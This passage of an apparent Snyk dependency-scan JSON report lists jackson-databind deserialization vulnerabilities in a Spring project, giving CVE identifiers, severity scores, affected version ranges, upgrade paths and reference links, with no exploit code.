Issue](https://github.com/FasterXML/jackson-databind/issues/1680)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1737)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id&#x3D;1506612)\n",
      "disclosureTime": "2017-06-26T21:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.6.7.1",
        "2.7.9.1",
        "2.8.10"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.1)",
            "[2.7,2.7.9.1)",
            "[2.8,2.8.10)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.1)",
            "[2.7,2.7.9.1)",
            "[2.8,2.8.10)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-31573",
      "identifiers": {
        "CVE": [
          "CVE-2017-15095"
        ],
        "CWE": [
          "CWE-184"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:55:06.594361Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-11-09T03:13:32Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/e8f043d1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1680"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1737"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id&%23x3D%3B1506612"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.1)",
          "[2.7.0,2.7.9.1)",
          "[2.8.0,2.8.10)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.7.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.10"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-01-11T11:41:28.547000Z",
      "credit": [
        "Imre Rad"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)). This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.8.11, 2.9.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1855)\n- [PoC Project](https://github.com/irsl/jackson-rce-via-spel/)\n",
      "disclosureTime": "2018-01-10T11:41:28Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.8.11",
        "2.9.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32043",
      "identifiers": {
        "CVE": [
          "CVE-2017-17485"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:58:05.283948Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-01-22T12:30:55Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1855"
        },
        {
          "title": "PoC Project",
          "url": "https://github.com/irsl/jackson-rce-via-spel/"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.8.11)",
          "[2.9.0,2.9.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.11.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2018-01-22T15:40:18.105000Z",
      "credit": [
        "Rui Chong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) and [CVE-2017-17485](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-32043)). This is exploitable via two different gadgets that bypass a blacklist.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.8.11, 2.9.4 or higher.\n## References\n- [GitHub Commit](https://github.com/GulajavaMinistudio/jackson-databind/pull/92/commits/038b471e2efde2e8f96b4e0be958d3e5a1ff1d05)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1899)\n",
      "disclosureTime": "2018-01-18T15:40:18Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.8.11",
        "2.9.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11)",
            "[2.9,2.9.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32044",
      "identifiers": {
        "CVE": [
          "CVE-2018-5968"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-w3f4-3q6j-rh82"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T16:03:51.361638Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-01-23T13:17:24Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/GulajavaMinistudio/jackson-databind/pull/92/commits/038b471e2efde2e8f96b4e0be958d3e5a1ff1d05"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1899"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.8.11)",
          "[2.9.0,2.9.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.11.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2018-02-26T15:13:40.723000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the `c3p0` libraries are available in the classpath.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.5, 2.8.11.1, 2.9.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/6799f8f10cc78e9af6d443ed6982d00a13f2e7d2)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/1931)\n",
      "disclosureTime": "2018-02-10T15:13:40Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.6.7.5",
        "2.8.11.1",
        "2.9.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.1)",
            "[2.9.0,2.9.5)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.1)",
            "[2.9.0,2.9.5)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-32111",
      "identifiers": {
        "CVE": [
          "CVE-2018-7489"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cggj-fvv3-cqwv"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:58:50.080780Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-02-26T15:13:40Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/6799f8f10cc78e9af6d443ed6982d00a13f2e7d2"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/1931"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.5)",
          "[2.7.0, 2.8.11.1)",
          "[2.9.0, 2.9.5)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.11.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2019-06-19T15:28:46.421239Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x through 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has JDOM 1.x or 2.x jar in the classpath, an attacker can send a specifically crafted JSON message that allows them to read arbitrary local files on the server.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9.1, 2.8.11.4, 2.7.9.6 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/5f7c69bba07a7155adde130d9dee2e54a54f1fa5)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2341)\n- [PoC Repository](https://github.com/Al1ex/CVE-2019-12814)\n",
      "disclosureTime": "2019-06-19T14:34:16Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.9.1",
        "2.8.11.4",
        "2.7.9.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450207",
      "identifiers": {
        "CVE": [
          "CVE-2019-12814"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cmfg-87vq-g5g4"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:54:24.955852Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-06-19T14:34:16Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/5f7c69bba07a7155adde130d9dee2e54a54f1fa5"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2341"
        },
        {
          "title": "PoC Repository",
          "url": "https://github.com/Al1ex/CVE-2019-12814"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9.1)",
          "[2.8.0,2.8.11.4)",
          "[,2.7.9.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
      "alternativeIds": [],
      "creationTime": "2019-06-25T10:06:54.889582Z",
      "credit": [
        "College of software Nankai University"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data which allows attackers to have a variety of impacts by leveraging failure to block the `logback-core` class from polymorphic deserialization. Depending on the `classpath` content, remote code execution may be possible.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9.1, 2.8.11.4, 2.7.9.6 or higher.\n## References\n- [Debian Security Announcement](https://lists.debian.org/debian-lts-announce/2019/06/msg00019.html)\n- [Exploit](https://github.com/jas502n/CVE-2019-12384)\n- [Github Fix](https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2334)\n- [Jackson CVEs Don't Panic - Blog](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [Release Notes](https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/release-notes/VERSION-2.x)\n",
      "disclosureTime": "2019-05-28T10:27:59Z",
      "exploit": "High",
      "fixedIn": [
        "2.9.9.1",
        "2.8.11.4",
        "2.7.9.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.1)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917",
      "identifiers": {
        "CVE": [
          "CVE-2019-12384"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mph4-vhrx-mv67"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-09-28T12:58:37.720993Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-06-25T10:26:29Z",
      "references": [
        {
          "title": "Debian Security Announcement",
          "url": "https://lists.debian.org/debian-lts-announce/2019/06/msg00019.html"
        },
        {
          "title": "Exploit",
          "url": "https://github.com/jas502n/CVE-2019-12384"
        },
        {
          "title": "Github Fix",
          "url": "https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2334"
        },
        {
          "title": "Jackson CVEs Don't Panic - Blog",
